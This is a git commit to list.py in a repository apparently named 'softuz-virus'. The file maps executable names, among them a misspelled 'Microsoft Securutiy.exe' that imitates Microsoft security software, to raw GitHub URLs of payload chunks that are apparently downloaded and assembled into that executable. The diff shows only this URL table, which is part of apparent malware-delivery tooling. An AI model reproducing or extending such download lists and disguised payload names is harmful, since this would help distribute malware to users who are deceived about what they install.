1f79308cf78546d9c7632672152df42564aac1f2
Yaxyobek0877 <106481261+Yaxyobek0877@users.noreply.github.com>
2023-12-29 07:03:55 +0500

    Update list.py

--- list.py
+++ list.py
@@ -1,4 +1,4 @@
-ls = [{"rest.exe": ["https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/rest.txt"]},{"Microsoft Securutiy_2.exe": ["https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/Securitiy_0.txt",
+ls = [{"Microsoft Securutiy.exe": ["https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/Securitiy_0.txt",
                                    "https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/Securitiy_1.txt",
                                    "https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/Securitiy_2.txt",
                                    "https://raw.githubusercontent.com/Yaxyobek0877/softuz-virus/main/Securitiy_3.txt",
